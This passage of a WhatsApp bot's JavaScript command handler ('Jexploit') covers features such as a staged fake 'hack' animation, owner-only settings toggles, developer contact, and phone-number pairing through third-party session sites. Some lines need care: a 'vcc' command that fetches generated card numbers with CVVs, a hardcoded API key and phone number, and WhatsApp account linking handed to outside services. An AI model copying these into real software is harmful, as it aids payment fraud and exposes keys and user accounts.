    const groupJids = Object.keys(groups).join('\n');
    reply(`📝 *Group JIDs:*\n\n${groupJids}`);
}
break
case "hack": {
try {
        const steps = [
            '💻 *HACKING SEQUENCE INITIATED...* 💻',
            '',
            '*Loading encryption bypass modules...* 🔐',
            '*Establishing secure connection to mainframe...* 🌐',
            '*Deploying rootkits...* 🛠️',
            '',
            '```[▓▓                    ] 10%``` ⏳',
            '```[▓▓▓▓▓                ] 30%``` ⏳',
            '```[▓▓▓▓▓▓▓▓▓           ] 50%``` ⏳',
            '```[▓▓▓▓▓▓▓▓▓▓▓▓▓       ] 70%``` ⏳',
            '```[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] 90%``` ⏳',
            '```[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓] 100%``` ✅',
            '',
            '🔒 *System Breach Successful!* 🔓',
            '*Gaining access to server logs...* 🖥️',
            '*Extracting sensitive data...* 📂',
            '',
            '```[DATA CAPTURED: 3.2GB]``` 📡',
            '```[TRANSMISSION SECURED]``` 🔒',
            '',
            '🚀 *Operation Complete!*',
            '',
            '⚠️ _This is a simulated hacking activity for entertainment purposes._',
            '⚠️ _Remember: Ethical hacking ensures safety._',
            '',
            '> *Jexploit: hacking simulation complete* ☣'
  
        ];

        for (const step of steps) {
            await conn.sendMessage(from, { text: step }, { quoted: mek });
            await new Promise(resolve => setTimeout(resolve, 1200)); // Adjust delay for realism
        }
    } catch (error) {
        console.error(error);
        reply(`❌ *Error:* ${error.message}`);
    }
}
break
case "request": {
if (!Access) return reply(mess.owner);
    if (!text) return reply(`Example: ${prefix + command} I would like a new feature (specify) to be added.`);

    const requestMsg = `
*REQUEST*

*User*: @${m.sender.split("@")[0]}
*Request*: ${text}

    `;

    const confirmationMsg = `
Hi ${m.pushName},

Your request has been forwarded to my developer.
Please wait for a reply.

*Details:*
${requestMsg}
    `;

    conn.sendMessage("256742932677@s.whatsapp.net", { text: requestMsg, mentions: [m.sender] }, { quoted: m });
    conn.sendMessage(m.chat, { text: confirmationMsg, mentions: [m.sender] }, { quoted: m });
}
break
case "reportbug": {
if (!Access) return reply(mess.owner);
    if (!text) return reply(`Example: ${prefix + command} Hey, play command isn't working`);

    const bugReportMsg = `
*BUG REPORT*

*User*: @${m.sender.split("@")[0]}
*Issue*: ${text}

    `;

    const confirmationMsg = `
Hi ${m.pushName},

Your bug report has been forwarded to my developer.
Please wait for a reply.

*Details:*
${bugReportMsg}
    `;

    conn.sendMessage("256742932677@s.whatsapp.net", { text: bugReportMsg, mentions: [m.sender] }, { quoted: m });
    conn.sendMessage(m.chat, { text: confirmationMsg, mentions: [m.sender] }, { quoted: m });
}
break
case "groupid": {
    if (!Access) return reply(mess.owner);
    if (!q) return reply('*Please provide a group link*!');
    
    let linkRegex = args.join(" ");
    let coded = linkRegex.split("https://chat.whatsapp.com/")[1];
    if (!coded) return reply("Link Invalid");

    conn.query({
      tag: "iq",
      attrs: {
        type: "get",
        xmlns: "w:g2",
        to: "@g.us"
      },
      content: [{ tag: "invite", attrs: { code: coded } }]
    }).then(async (res) => {
      const tee = `${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}`;
      reply(tee + '@g.us');
    });
}
break
case 'autotyping':
case 'typing': {
    if (!Access) return reply(mess.owner);
    const autoTyping = await db.get(botNumber, 'autoTyping', false);
    
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        return reply(`❌ Usage: ${prefix}autotyping <on/off>`);
    }
    
    const boolValue = mode === 'on';
    
    // Save to database (batched, efficient!)
    await db.set(botNumber, 'autoTyping', boolValue);
    
    reply(`✅ Auto-typing ${boolValue ? 'enabled' : 'disabled'}`);
    break;
}
case 'autoreact': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.get(botNumber, 'autoreact', false);
        return reply(`❌ Usage: ${prefix}autoreact <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
    }
    
    const boolValue = mode === 'on';
    await db.set(botNumber, 'autoreact', boolValue);
    reply(`✅ Auto-react ${boolValue ? 'enabled' : 'disabled'}`);
    break;
}
case 'autoread': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.get(botNumber, 'autoread', false);
        return reply(`❌ Usage: ${prefix}autoread <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
    }
    
    const boolValue = mode === 'on';
    await db.set(botNumber, 'autoread', boolValue);
    reply(`✅ Auto-read ${boolValue ? 'enabled' : 'disabled'}`);
    break;
}
case 'autorecord':
case 'autorecording': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.get(botNumber, 'autorecording', false);
        return reply(`❌ Usage: ${prefix}autorecord <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
    }
    
    const boolValue = mode === 'on';
    await db.set(botNumber, 'autorecording', boolValue);
    reply(`✅ Auto-recording ${boolValue ? 'enabled' : 'disabled'}`);
    break;
}
case 'aichat':
case 'aichatbot':
case 'setai': {
    if (!Access) return reply(mess.owner);
    
    const mode = args[0]?.toLowerCase();
    if (!mode || !['on', 'off'].includes(mode)) {
        const current = await db.get(botNumber, 'AI_CHAT', false);
        return reply(`❌ Usage: ${prefix}aichat <on/off>\n\nCurrent: ${current ? 'ON ✅' : 'OFF ❌'}`);
    }
    // Message memory for conversation context
   let messageMemory = new Map();
   const MAX_MEMORY = 150; // Maximum messages to remember per chat
   
    const boolValue = mode === 'on';
    await db.set(botNumber, 'AI_CHAT', boolValue);
    
    // Clear memory when turning off/on
    if (boolValue) {
        // Clear old memory when turning on
        messageMemory.clear();
    }
    
    reply(`✅ AI Chatbot ${boolValue ? 'enabled' : 'disabled'}`);
    
}
break
case 'deletepp':
case 'delpp': {
if (!Access) return reply(mess.owner);
conn.removeProfilePicture(conn.user.id)
("*Successfully deleted profile pic*")
}
break 
case "unblockall": {
    if (!Access) return reply(mess.owner);

    try {
      const blockedList = await conn.fetchBlocklist();
      if (!blockedList.length) return reply("✅ No blocked contacts to unblock.");

      for (const user of blockedList) {
        await conn.updateBlockStatus(user, "unblock");
      }

      reply(`✅ Successfully unblocked *${blockedList.length}* contacts.`);
    } catch (error) {
      reply("⚠️ Failed to unblock all contacts.");
    }
}
break
break
case "leave":
case "leavegc": {
if (!m.isGroup) return reply(mess.group);
if (!Access) return reply(mess.owner);
    reply("*Goodbye, it was nice being here!*");
    await sleep(3000);
    await conn.groupLeave(m.chat);
}
break
case "setbio": {
if (!Access) return reply(mess.owner);
if (!text) return reply(`*Text needed*\nExample: ${prefix + command} ${global.botname}`);

    await conn.updateProfileStatus(text);
    reply(`*Successfully updated bio to "${text}"*`);
}
break
case "p":
case "ping": {
const startTime = performance.now();

    try {
      const sentMessage = await conn.sendMessage(m.chat, {
        text: "🔸Pong!",
        contextInfo: { quotedMessage: m.message }
      });
      
      const endTime = performance.now();
      const latency = `${(endTime - startTime).toFixed(2)} ms`;
      
      await conn.sendMessage(m.chat, {
        text: `*🏓 ${global.botname} Speed:* ${latency}`,
        edit: sentMessage.key, 
        contextInfo: { quotedMessage: m.message }
      });

    } catch (error) {
      console.error('Error sending ping message:', error);
      await conn.sendMessage(m.chat, {
        text: 'An error occurred while trying to ping.',
        contextInfo: { quotedMessage: m.message }
      });
   }
}
break
case "up":
case "uptime": {
    const startTime = performance.now();

    try {
        const sentMessage = await conn.sendMessage(m.chat, {
            text: "⚡ Testing connection...",
            contextInfo: { quotedMessage: m.message }
        });
        
        const endTime = performance.now();
        const ping = `${(endTime - startTime).toFixed(2)}`;
        
        // Get uptime
        const uptime = process.uptime();
        const uptimeFormatted = runtime(uptime); // Using your existing runtime function
        
        // Get bot name from settings
        const botname = `${global.botname}`;
        
        // Get version from global or use default
        const version = global.versions || versions || '2.0.0';
        
        // Formatted response
        const botInfo = `
╭──❍ 💫 ${botname} ❍─
┊ 🚀 ᴘɪɴɢ    : ${ping} ms
┊ ⏱  ᴜᴘᴛɪᴍᴇ  : ${uptimeFormatted}
┊ 🔖 ᴠᴇʀsɪᴏɴ  : ${version}
╰━━━━━━━━━`;
        
        await conn.sendMessage(m.chat, {
            text: botInfo,
            edit: sentMessage.key,
            contextInfo: { quotedMessage: m.message }
        });

    } catch (error) {
        await conn.sendMessage(m.chat, {
            text: '❌ An error occurred while testing connection.',
            contextInfo: { quotedMessage: m.message }
        });
    }
    
}
break
case "sc": {
  try {
    // GitHub repository details
    const repoOwner = "Kevintech-hub";
    const repoName = "Jexploit-Bot";
    const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}`;
    
    // Fetch repository data with error handling
    const { data } = await axios.get(apiUrl, {
      timeout: 5000, // 5 second timeout
      headers: {
        'User-Agent': 'Jexploit-Bot' // GitHub requires user-agent
      }
    }).catch(err => {
      console.error('GitHub API Error:', err);
      throw new Error('Failed to connect to GitHub API');
    });

    // Validate response data
    if (!data || typeof data !== 'object') {
      throw new Error('Invalid GitHub API response');
    }

    // Format repository information
    const repoInfo = `
    *BOT REPOSITORY*
    
 *Name:* ${String(data.name || repoName).padEnd(20)}
 *Stars:* ${String(data.stargazers_count || 0).padEnd(20)}
 *Forks:* ${String(data.forks_count || 0).padEnd(21)}
 *Watchers:* ${String(data.watchers_count || 0).padEnd(18)}
 *Language:* ${String(data.language || 'Not specified').padEnd(16)}
 *License:* ${String(data.license?.name || 'None').padEnd(19)}
 *GitHub Link:* 
https://github.com/${repoOwner}/${repoName}

*Session Id:* https://vinic-xmd-pairing-site-dsf-crew-devs.onrender.com/
────────────────────────────────
@${m.sender.split("@")[0]}👋, Don't forget to star and fork my repository!`;
    // Send the response with thumbnail
    await conn.sendMessage(
      m.chat,
      {
        text: repoInfo.trim(),
        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
            title: "Jexploit Repository",
            body: `⭐ Star the repo to support development!`,
            thumbnail: await getBuffer('https://files.catbox.moe/uy3kq9.jpg'), // Fallback thumbnail
            mediaType: 1,
            sourceUrl: `https://github.com/${repoOwner}/${repoName}`
          }
        }
      },
      { quoted: m }
    );

  } catch (error) {
    console.error('Repo command error:', error);
    
    // Fallback response when GitHub API fails
    const fallbackInfo = `
    * BOT REPOSITORY *
    
 *Name:* Jexploit 
 *GitHub Link:* 
https://github.com/Kevintech-hub/Vinic-Xmd-

@${m.sender.split("@")[0]}👋, Visit the repository for more info!`;

    await conn.sendMessage(
      m.chat,
      { 
        text: fallbackInfo,
        contextInfo: {
          mentionedJid: [m.sender]
        }
      },
      { quoted: m }
    );
  }
}
break
case 'github':
case 'repo': {
    try {
        // Import and execute github command
        const githubCommand = require('./KelvinCmds/github')
        await githubCommand(conn, m.chat, m);
    } catch (error) {
        console.error('Error in github command:', error);
        reply('❌ Error fetching repository information.');
    }
    
}
break
case "alive": {
    const botUptime = runtime(process.uptime());
    
    const imageUrls = [
        "./start/lib/Media/Jexploit1.jpg",
        "./start/lib/Media/Jexploit2.jpg"   
    ];
    
    // Array of audio URLs
    const audioUrls = [
        './start/lib/Media/JexAudio1.mp3',
        './start/lib/Media/JexAudio2.mp3',
        './start/lib/Media/JexAudio3.mp3',
        './start/lib/Media/JexAudio4.mp3',
        './start/lib/Media/JexAudio5.mp3',
        './start/lib/Media/JexAudio6.mp3',
        './start/lib/Media/JexAudio7.mp3'
    ];
    
    // Randomly select an image URL
    const randomImageUrl = imageUrls[Math.floor(Math.random() * imageUrls.length)];
    
    // Randomly select an audio URL
    const randomAudioUrl = audioUrls[Math.floor(Math.random() * audioUrls.length)];
    
    // Send the randomly selected image with caption
    await conn.sendMessage(
        m.chat, 
        { 
            image: { url: randomImageUrl },
            caption: `*🌹Hi. I am 👑 Jexploit, a friendly WhatsApp bot from Uganda 🇺🇬, created by Kevin tech. Don't worry, I'm still Alive☺🚀*\n\n*⏰ Uptime:${botUptime}*`
        },
        { quoted: m }
    ).catch(err => {
        console.error('Image failed:', err.message);
        // Fallback if image fails
        return conn.sendMessage(m.chat, {
            text: `*🌹Hi. I am 👑 Jexploit, a friendly WhatsApp bot from Uganda 🇺🇬, created by Kevin tech. Don't worry, I'm still Alive☺🚀*\n\n*⏰ Uptime:${botUptime}*`
        }, { quoted: m });
    });
    
    // Send the randomly selected audio as audio (not PTT)
    await conn.sendMessage(
        m.chat,
        {
            audio: { url: randomAudioUrl },
            mimetype: 'audio/mpeg'  
        },
        { quoted: m }
    ).catch(err => console.error('Audio failed:', err.message)); 
    
    break;
}

case 'botinfo': {
    const botInfo = `
╭─ ⌬ Bot Info
│ • Name     : ${botname}
│ • Owner    : ${ownername}
│ • Version  : ${global.versions}
│ • ᴄᴍᴅs    : 100+
│ • Developer: Kelvin tech
│ • Runtime  : ${runtime(process.uptime())}
╰─────────────`;

    const imageUrls = [
        "./start/lib/Media/Jexploit1.jpg", 
        "./start/lib/Media/Jexploit2.jpg"
    ];
    
    // Array of audio URLs
    const audioUrls = [
        './start/lib/Media/JexAudio1.mp3',
        './start/lib/Media/JexAudio2.mp3',
        './start/lib/Media/JexAudio3.mp3',
        './start/lib/Media/JexAudio4.mp3',
        './start/lib/Media/JexAudio5.mp3',
        './start/lib/Media/JexAudio6.mp3',
        './start/lib/Media/JexAudio7.mp3'
    ];
    
    const randomImageUrl = imageUrls[Math.floor(Math.random() * imageUrls.length)];
    
    // Randomly select an audio URL
    const randomAudioUrl = audioUrls[Math.floor(Math.random() * audioUrls.length)];
    
    // Send the image with caption
    await conn.sendMessage(
        m.chat, 
        { 
            image: { url: randomImageUrl },  
            caption: `*🌹Hi. I am 👑 Jexploit, a friendly WhatsApp bot.*${botInfo}`
        },
        { quoted: m }
    ).catch(err => {
        console.error('Image failed:', err.message);
        // Fallback if image fails
        return conn.sendMessage(m.chat, {
            text: `*🌹Hi. I am 👑 Jexploit, a friendly WhatsApp bot.*${botInfo}`
        }, { quoted: m });
    });
    
    // Send the randomly selected audio as audio
    await conn.sendMessage(
        m.chat,
        {
            audio: { url: randomAudioUrl },
            mimetype: 'audio/mpeg'  // Fixed mimetype
        },
        { quoted: m }
    ).catch(err => console.error('Audio failed:', err.message));
    
    break;
}
break
case "bothosting": {
try {
        

        const message = `
*STEPS ON HOW TO DEPLOY A WHATSAPP BOT*
First you need a GitHub account.
Create one using the link:
https://github.com/

Secondly create a discord account.
https://discord.com/login

Once your done creating and verifying the two account, move over to the next step.

*NEXT STEPS*
Next step is to fork the bot repository. Click the link
https://github.com/Kevintech-hub/Jexploit-Bot

Then download the zip file.

Now authorise your discord account then claim coins for 3days, each day u can claim 10 coins.


https://bot-hosting.net/?aff=1334589985369624636

*NOTE:* Some bot require larger server to process while. (25 coin)

When your done creating a server (25 coin) open the server.

Upload your bot code you have downloaded

Start server Enjoy 😉
        `.trim();

        await conn.sendMessage(from, {
            image: { url: 'https://files.catbox.moe/9sazwf.jpg' },
            caption: message,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363401548261516@newsletter',
                    newsletterName: '🪀『JEXPLOIT』🪀',
                    serverMessageId: 143
                }
            }
        }, { quoted: mek });

    } catch (e) {
        console.error("Support Cmd Error:", e);
        reply(`⚠️ An error occurred:\n${e.message}`);
    }
}
break
case "botstatus": {
const used = process.memoryUsage();
      const ramUsage = `${formatSize(used.heapUsed)} / ${formatSize(os.totalmem())}`;
      const freeRam = formatSize(os.freemem());
      const disk = await checkDiskSpace(process.cwd());
      const latencyStart = performance.now();
      
      await reply("⏳ *Calculating ping...*");
      const latencyEnd = performance.now();
      const ping = `${(latencyEnd - latencyStart).toFixed(2)} ms`;

      const { download, upload } = await checkBandwidth();
      const uptime = runtime(process.uptime());

      const response = `
      ╭─ ⌬ Bot Status
│ • Ping      : ${ping}ms
│ • Uptime    : ${uptime}
│ • RAM Usage : ${ramUsage}
│ • Free RAM  : ${freeRam}
│
│ • Disk Usage: ${formatSize(disk.size - disk.free)} / ${formatSize(disk.size)}
│ • Free Disk : ${formatSize(disk.free)}
│
│ • Platform  : ${os.platform()}
│ • NodeJS    : ${process.version}
│ • CPU Model : ${os.cpus()[0].model}
│
│ • Downloaded: ${download}
│ • Uploaded  : ${upload}
╰─────────────
`;

      conn.sendMessage(m.chat, { text: response.trim() }, { quoted: m });
}
break
case 'p':
case 'pair': {
    if (!text) return reply('*🔢 Provide a phone number*\n📌 *Example:* .pair 256755585369\n📌 *Example:* .pair +256755585369');

    try {
        // React while processing
        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

        // Clean the phone number
        const number = text.replace(/\+|\s/g, '').trim();
        
        // Validate phone number
        if (!/^\d{10,15}$/.test(number)) {
            return reply('❌ *Invalid phone number format!*\nPlease provide a valid number (10-15 digits).');
        }

        // Jexploit Session API endpoint
        const jexploitUrl = `https://jexploitsession.zone.id/pair?number=${encodeURIComponent(number)}`;
        
        // Backup API endpoints (original ones)
        const backupApis = [
            `https://vinic-xmd-pair-2-kevintech.onrender.com/pair?number=${encodeURIComponent(number)}`,
            `https://vinic-xmd-pairing-site-dsf-crew-devs.onrender.com/pair?number=${encodeURIComponent(number)}`
        ];

        let pairCode = null;
        let apiUsed = 'Jexploit Session Service';
        let pairUrl = ''; // To store the pairing URL

        // Try Jexploit API first
        try {
            console.log(`[PAIR] Trying Jexploit API: ${jexploitUrl}`);
            const response = await fetch(jexploitUrl, { 
                timeout: 15000,
                headers: {
                    'User-Agent': 'Jexploit-Bot/1.0'
                }
            });
            
            if (response.ok) {
                const data = await response.json();
                console.log('[PAIR] Jexploit API response:', data);
                
                // Handle Jexploit API response format
                if (data.code) {
                    pairCode = data.code;
                } else if (data.pairCode) {
                    pairCode = data.pairCode;
                } else if (data.result?.code) {
                    pairCode = data.result.code;
                } else if (data.data?.code) {
                    pairCode = data.data.code;
                } else if (typeof data === 'string') {
                    // If API returns plain string
                    pairCode = data;
                }
                
                // If Jexploit returns a direct link instead of just code
                if (data.link) {
                    pairUrl = data.link;
                } else if (data.url) {
                    pairUrl = data.url;
                }
                
                // If no URL but we have code, construct the Jexploit pairing URL
                if (pairCode && !pairUrl) {
                    pairUrl = `https://jexploitsession.zone.id/link?code=${encodeURIComponent(pairCode)}`;
                }
            } else {
                console.log(`[PAIR] Jexploit API failed with status: ${response.status}`);
            }
        } catch (error) {
            console.log(`[PAIR] Jexploit API error: ${error.message}`);
        }

        // If Jexploit API failed, try backup APIs
        if (!pairCode && !pairUrl) {
            console.log('[PAIR] Trying backup APIs...');
            apiUsed = 'Backup API';
            
            for (const url of backupApis) {
                try {
                    console.log(`[PAIR] Trying backup: ${url}`);
                    const response = await fetch(url, { timeout: 10000 });
                    
                    if (response.ok) {
                        const data = await response.json();
                        
                        // Handle different API response formats
                        if (data.code) {
                            pairCode = data.code;
                        } else if (data.pairCode) {
                            pairCode = data.pairCode;
                        } else if (data.result?.code) {
                            pairCode = data.result.code;
                        } else if (data.data?.code) {
                            pairCode = data.data.code;
                        } else if (typeof data === 'string') {
                            // If API returns plain string
                            pairCode = data;
                        }
                        
                        if (pairCode) {
                            apiUsed = url.includes('kevintech') ? 'KevinTech API' : 'DSF Crew API';
                            // For backup APIs, create the Jexploit URL
                            pairUrl = `https://jexploitsession.zone.id/link?code=${encodeURIComponent(pairCode)}`;
                            break;
                        }
                    }
                } catch (error) {
                    console.log(`[PAIR] Backup API ${url} failed: ${error.message}`);
                    continue;
                }
            }
        }

        if (!pairCode && !pairUrl) {
            throw new Error('No pair code or URL received from any API');
        }

        // Create formatted response
        let responseText = '';
        
        if (pairUrl) {
            // If we have a direct URL
            responseText = `✅ *PAIRING LINK GENERATED*\n\n` +
                `📱 *Phone Number:* ${number}\n` +
                `🔗 *Pairing Link:* ${pairUrl}\n` +
                `⚡ *Source:* ${apiUsed}\n\n` +
                `📲 *HOW TO LINK WHATSAPP:*\n` +
                `1. Click the link above on your phone\n` +
                `2. OR Open the link in your mobile browser\n` +
                `3. Follow the instructions to link WhatsApp\n\n` +
                `⏳ *Link expires in 2 minutes!*\n` +
                `🔒 *Keep this link private!*`;
                
            // Also show the code if available
            if (pairCode) {
                responseText += `\n\n🔑 *Alternative - Use Code:* \`\`\`${pairCode}\`\`\``;
            }
        } else if (pairCode) {
            // If we only have code
            responseText = `✅ *PAIR CODE GENERATED*\n\n` +
                `*Phone Number:* ${number}\n` +
                `*Pair Code:* \`\`\`${pairCode}\`\`\`\n` +
                `*Pairing Link:* https://jexploitsession.zone.id/link?code=${encodeURIComponent(pairCode)}\n` +
                `*Source:* ${apiUsed}\n\n` +
                `*HOW TO LINK WHATSAPP:*\n` +
                `Method 1: Use the link above on your phone\n` +
                `Method 2: Go to WhatsApp > Settings > Linked Devices > Link with Phone > Enter code\n\n` +
                `⏳ *Code expires in 2 minutes!*\n` +
                `🔒 *Keep this code private!*`;
        }

        // Send the pair code/link
        await conn.sendMessage(
            m.chat,
            { text: responseText },
            { quoted: m }
        );

        // Success reaction
        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (error) {
        console.error('Pair command error:', error);
        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
        
        reply(`❌ *Failed to generate pair code!*\n\nPossible reasons:\n• Jexploit session service is down\n• Invalid phone number format\n• Network issues\n\nTry again or contact support.\n\n🔗 *Alternative:* Visit https://jexploitsession.zone.id manually`);
    }
}
break
case "serverinfo": { 
const start = performance.now();
const cpus = os.cpus();
const uptimeSeconds = os.uptime();
const muptime = runtime(process.uptime()).trim()
const uptimeDays = Math.floor(uptimeSeconds / 86400);
const uptimeHours = Math.floor((uptimeSeconds % 86400) / 3600);
const uptimeMinutes = Math.floor((uptimeSeconds % 3600) / 60);
const uptimeSecs = Math.floor(uptimeSeconds % 60);
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const formattedUsedMem = formatSize(usedMem);
const formattedTotalMem = formatSize(totalMem);
const loadAverage = os.loadavg().map(avg => avg.toFixed(2)).join(", ");
const speed = (performance.now() - start).toFixed(3);

const serverInfo = `Server Information:\n
- CPU Cores: ${cpus.length}
- CPU Model: ${cpus[0].model}
- Platform: ${os.platform()}
- Architecture: ${os.arch()}
- Uptime: ${uptimeDays}d ${uptimeHours}h ${uptimeMinutes}m ${uptimeSecs}s
- RAM: ${formattedUsedMem} / ${formattedTotalMem}
- Load Average (1, 5, 15 min): ${loadAverage}
- Response Time: ${speed} seconds
- Runtime: ${muptime}
- Type: case 
`.trim();

await reply(serverInfo)
}
break
//======[OTHER MUNE CMDS]====
case 'weather': {
                      try {

if (!text) return reply("provide a city/town name");

const response = await fetch(`http://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=1ad47ec6172f19dfaf89eb3307f74785`);
        const data = await response.json();

console.log("Weather data:",data);

        const cityName = data.name;
        const temperature = data.main.temp;
        const feelsLike = data.main.feels_like;
        const minTemperature = data.main.temp_min;
        const maxTemperature = data.main.temp_max;
        const description = data.weather[0].description;
        const humidity = data.main.humidity;
        const windSpeed = data.wind.speed;
        const rainVolume = data.rain ? data.rain['1h'] : 0;
        const cloudiness = data.clouds.all;
        const sunrise = new Date(data.sys.sunrise * 1000);
        const sunset = new Date(data.sys.sunset * 1000);

await m.reply(`❄️ Weather in ${cityName}

🌡️ Temperature: ${temperature}°C
📝 Description: ${description}
❄️ Humidity: ${humidity}%
🌀 Wind Speed: ${windSpeed} m/s
🌧️ Rain Volume (last hour): ${rainVolume} mm
☁️ Cloudiness: ${cloudiness}%
🌄 Sunrise: ${sunrise.toLocaleTimeString()}
🌅 Sunset: ${sunset.toLocaleTimeString()}`);

} catch (e) { reply("Unable to find that location.") }
  }
break;
case 'add2': {
                if (!m.isGroup) return m.reply(mess.group)
                if(!Access) return m.reply(mess.owner)
                if (!m.isAdmin) return reply(mess.notadmin);
                if (!m.isBotAdmin) return reply(mess.botadmin);
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
                m.reply(mess.done)
          }
                



//==================================================//   
case "disp90days": { 
 if (!m.isGroup) return reply (mess.group); 

 if (!m.isAdmin) return reply(mess.notadmin);
 if (!m.isBotAdmin) return reply(mess.botadmin);

                     await conn.groupToggleEphemeral(m.chat, 90*24*3600); 
 m.reply('Dissapearing messages successfully turned on for 90 days!'); 
 } 
 break; 
//==================================================//         
case "dispoff": { 
    if (!m.isGroup) return reply (mess.group); 

    if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
                     await conn.groupToggleEphemeral(m.chat, 0); 
 m.reply('Dissapearing messages successfully turned off!'); 
 }
   break;

//==================================================//  
case "disp24hours": { 
if (!m.isGroup) return reply (mess.group); 

 if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);

                     await conn.groupToggleEphemeral(m.chat, 1*24*3600); 
 m.reply('Dissapearing messages successfully turned on for 24hrs!'); 
 } 
break
//==================================================//
case "dev":
case "developer": {
  try {
    // Developer information (replace with your actual details)
    const devInfo = {
      name: "Kevin Tech",      // Developer name
      number: "256742932677",  // Developer WhatsApp number (without + or @)
      organization: "Jexploit Development Team",
      note: "Bot Developer"
    };

    // Create vCard
    const vcard = `BEGIN:VCARD
VERSION:3.0
FN:${devInfo.name}
ORG:${devInfo.organization};
TEL;type=CELL;type=VOICE;waid=${devInfo.number}:${devInfo.number}
NOTE:${devInfo.note}
END:VCARD`;

    // Send as contact card
    await conn.sendMessage(
      m.chat, 
      {
        contacts: {
          displayName: devInfo.name,
          contacts: [{
            displayName: devInfo.name,
            vcard: vcard
          }]
        },
        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
            title: `Developer Contact`,
            body: `Contact ${devInfo.name} for support`,
            thumbnail: fs.readFileSync('./start/lib/kelvin/dev.jpg'), // Your dev photo
            mediaType: 1,
            renderLargerThumbnail: true
          }
        }
      },
      { quoted: m }
    );

    // Also send text info as fallback
    await conn.sendMessage(
      m.chat,
      { 
        text: `👨‍💻 *Developer Information*\n\n` +
              `• *Name:* ${devInfo.name}\n` +
              `• *Contact:* wa.me/${devInfo.number}\n` +
              `• *Role:* ${devInfo.note}\n` +
              `• *Team:* ${devInfo.organization}`,
              
        mentions: [m.sender]
      },
      { quoted: m }
    );

  } catch (error) {
    console.error('Error in dev command:', error);
    reply(mess.error);
  }
}
break
case "say": {
let text = args.join(" ");
    if (!text) return reply("*Text needed!*");

    try {
      const ttsData = await googleTTS.getAllAudioBase64(text, {
        lang: "en",
        slow: false,
        host: "https://translate.google.com",
        timeout: 10000,
      });

      if (!ttsData.length) return reply("*Failed to generate TTS audio.*");

      const tempFiles = [];
      for (let i = 0; i < ttsData.length; i++) {
        let filePath = `/tmp/tts_part${i}.mp3`;
        fs.writeFileSync(filePath, Buffer.from(ttsData[i].base64, "base64"));
        tempFiles.push(filePath);
      }

      
      let mergedFile = "/tmp/tts_merged.mp3";
      let ffmpegCommand = `ffmpeg -i "concat:${tempFiles.join('|')}" -acodec copy ${mergedFile}`;
      exec(ffmpegCommand, async (err) => {
        if (err) {
          console.error("FFmpeg error:", err);
          return reply("*Error merging audio files.*");
        }

        await conn.sendMessage(
          m.chat,
          {
            audio: fs.readFileSync(mergedFile),
            mimetype: "audio/mp4",
            mp3: true,
            fileName: "tts_audio.mp3",
          },
          { quoted: m }
        );

        tempFiles.forEach(file => fs.unlinkSync(file));
        fs.unlinkSync(mergedFile);
      });
    } catch (error) {
      console.error("Error in TTS Command:", error);
      reply(mess.error);
    }
}
break
case "tinylink": {
    if (!text) return reply(`*Example: ${prefix + command} https://github.com/Kevintech-hub/Vinic-Xmd-*`);
    
    try {
      const response = await axios.get(`https://tinyurl.com/api-create.php?url=${text}`);
      reply(response.data);
    } catch (error) {
      console.error(error);
      reply(mess.error);
    }
}
break
case "vcc": {
const apiUrl = `${global.mess.siputzx}/api/tools/vcc-generator?type=MasterCard&count=5`;

    try {
      const response = await fetch(apiUrl);
      const result = await response.json();

      if (!result.status || !result.data || result.data.length === 0) {
        return reply("❌ Unable to generate VCCs. Please try again later.");
      }

      let responseMessage = `🎴 *Generated VCCs* (Type: Mastercard and Count: 5):\n\n`;

      result.data.forEach((card, index) => {
        responseMessage += `#️⃣ *Card ${index + 1}:*\n`;
        responseMessage += `🔢 *Card Number:* ${card.cardNumber}\n`;
        responseMessage += `📅 *Expiration Date:* ${card.expirationDate}\n`;
        responseMessage += `🧾 *Cardholder Name:* ${card.cardholderName}\n`;
        responseMessage += `🔒 *CVV:* ${card.cvv}\n\n`;
      });

      reply(responseMessage);
    } catch (error) {
      console.error("Error fetching VCC data:", error);
      reply(mess.error);
    }
}
break
case "calculate":
case "calc": {
    try {
        if (!text) return reply(`📝 *Examples:*\n${prefix}calc 5 + 3\n${prefix}calc 10% of 200\n${prefix}calc 2^3\n${prefix}calc sqrt(16)`);

        // Clean and prepare the expression
        const expr = text
            .replace(/×/g, '*')
            .replace(/÷/g, '/')
            .replace(/π/g, 'pi')
            .replace(/π/g, 'pi')
            .replace(/\^/g, '**') // Convert ^ to ** for exponentiation
            .replace(/sqrt\(/g, 'Math.sqrt(')
            .replace(/sin\(/g, 'Math.sin(')
            .replace(/cos\(/g, 'Math.cos(')
            .replace(/tan\(/g, 'Math.tan(')
            .replace(/log\(/g, 'Math.log10(')
            .replace(/ln\(/g, 'Math.log(')
